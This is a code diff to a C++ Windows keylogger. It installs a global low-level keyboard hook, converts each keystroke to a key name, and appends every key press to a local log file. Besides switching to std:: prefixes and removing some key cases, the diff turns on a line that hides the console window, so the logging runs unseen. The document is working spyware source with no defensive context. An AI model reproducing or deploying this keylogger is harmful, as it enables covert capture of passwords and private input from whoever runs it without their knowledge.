@@ -2,12 +2,10 @@
 #include <fstream>
 #include <windows.h>
 
-using namespace std;
-
 #define FILEPATH "log.txt"
 
-string ConvertVkCode(DWORD vkCode) {
-    string convertedKeyInput;
+std::string ConvertVkCode(DWORD vkCode) {
+    std::string convertedKeyInput;
 
     switch (vkCode) {
         case VK_ADD : convertedKeyInput = "Numpad +"; break;
@@ -22,8 +20,6 @@ string ConvertVkCode(DWORD vkCode) {
         case VK_ESCAPE : convertedKeyInput = "Esc"; break;
         case VK_EXECUTE : convertedKeyInput = "Execute"; break;
         case VK_EXSEL : convertedKeyInput = "Ex Sel"; break;
-        case VK_ICO_CLEAR : convertedKeyInput = "IcoClr"; break;
-        case VK_ICO_HELP : convertedKeyInput = "IcoHlp"; break;
         case VK_MULTIPLY : convertedKeyInput = "Numpad *"; break;
         case VK_NONAME : convertedKeyInput = "NoName"; break;
         case VK_NUMPAD0 : convertedKeyInput = "Numpad 0"; break;
@@ -45,29 +41,11 @@ string ConvertVkCode(DWORD vkCode) {
         case VK_OEM_6 : convertedKeyInput = "OEM_6 (} ])"; break;
         case VK_OEM_7 : convertedKeyInput = "OEM_7 (\" ')"; break;
         case VK_OEM_8 : convertedKeyInput = "OEM_8 (§ !)"; break;
-        case VK_OEM_ATTN : convertedKeyInput = "Oem Attn"; break;
-        case VK_OEM_AUTO : convertedKeyInput = "Auto"; break;
-        case VK_OEM_AX : convertedKeyInput = "Ax"; break;
-        case VK_OEM_BACKTAB : convertedKeyInput = "Back Tab"; break;
         case VK_OEM_CLEAR : convertedKeyInput = "OemClr"; break;
         case VK_OEM_COMMA : convertedKeyInput = "OEM_COMMA (< ,)"; break;
-        case VK_OEM_COPY : convertedKeyInput = "Copy"; break;
-        case VK_OEM_CUSEL : convertedKeyInput = "Cu Sel"; break;
-        case VK_OEM_ENLW : convertedKeyInput = "Enlw"; break;
-        case VK_OEM_FINISH : convertedKeyInput = "Finish"; break;
-        case VK_OEM_FJ_LOYA : convertedKeyInput = "Loya"; break;
-        case VK_OEM_FJ_MASSHOU : convertedKeyInput = "Mashu"; break;
-        case VK_OEM_FJ_ROYA : convertedKeyInput = "Roya"; break;
-        case VK_OEM_FJ_TOUROKU : convertedKeyInput = "Touroku"; break;
-        case VK_OEM_JUMP : convertedKeyInput = "Jump"; break;
         case VK_OEM_MINUS : convertedKeyInput = "OEM_MINUS (_ -)"; break;
-        case VK_OEM_PA1 : convertedKeyInput = "OemPa1"; break;
-        case VK_OEM_PA2 : convertedKeyInput = "OemPa2"; break;
-        case VK_OEM_PA3 : convertedKeyInput = "OemPa3"; break;
         case VK_OEM_PERIOD : convertedKeyInput = "OEM_PERIOD (> .)"; break;
         case VK_OEM_PLUS : convertedKeyInput = "OEM_PLUS (+ =)"; break;
-        case VK_OEM_RESET : convertedKeyInput = "Reset"; break;
-        case VK_OEM_WSCTRL : convertedKeyInput = "WsCtrl"; break;
         case VK_PA1 : convertedKeyInput = "Pa1"; break;
         case VK_PACKET : convertedKeyInput = "Packet"; break;
         case VK_PLAY : convertedKeyInput = "Play"; break;
@@ -120,7 +98,6 @@ string ConvertVkCode(DWORD vkCode) {
         case VK_FINAL : convertedKeyInput = "Final"; break;
         case VK_HELP : convertedKeyInput = "Help"; break;
         case VK_HOME : convertedKeyInput = "Home"; break;
-        case VK_ICO_00 : convertedKeyInput = "Ico00 *"; break;
         case VK_INSERT : convertedKeyInput = "Insert"; break;
         case VK_JUNJA : convertedKeyInput = "Junja"; break;
         case VK_KANA : convertedKeyInput = "Kana"; break;
@@ -144,7 +121,6 @@ string ConvertVkCode(DWORD vkCode) {
         case VK_NEXT : convertedKeyInput = "Page Down"; break;
         case VK_NONCONVERT : convertedKeyInput = "Non Convert"; break;
         case VK_NUMLOCK : convertedKeyInput = "Num Lock"; break;
-        case VK_OEM_FJ_JISHO : convertedKeyInput = "Jisho"; break;
         case VK_PAUSE : convertedKeyInput = "Pause"; break;
         case VK_PRINT : convertedKeyInput = "Print"; break;
         case VK_PRIOR : convertedKeyInput = "Page Up"; break;
@@ -165,7 +141,7 @@ string ConvertVkCode(DWORD vkCode) {
         case VK_XBUTTON2 : convertedKeyInput = "X Button 2 **"; break;
         default:
             char keyChar = (char)vkCode;
-            string temp(1, keyChar);
+            std::string temp(1, keyChar);
             convertedKeyInput = temp;
             break;
     }
@@ -182,7 +158,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         DWORD vkCode = press->vkCode; // Get the virtual keycode
         if ((wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN)) // Keydown
         {
-            ofstream file(FILEPATH, std::ios_base::app);
+            std::ofstream file(FILEPATH, std::ios_base::app);
             if (file.is_open())
             {
                 file << ConvertVkCode(vkCode) << "\n";
@@ -190,9 +166,9 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             }
             else
             {
-                cout << "Unable to open the log file.\n";
+                std::cout << "Unable to open the log file.\n";
             }
-            cout << ConvertVkCode(vkCode) << "\n";
+            std::cout << ConvertVkCode(vkCode) << "\n";
         }
     }
     return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
@@ -201,7 +177,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 int main()
 {
     // Hidding console window while executing
-    //ShowWindow(GetConsoleWindow(), SW_HIDE);
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     // dwThreadId is set to 0 to make a global injection
     HHOOK hookLowLevelKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
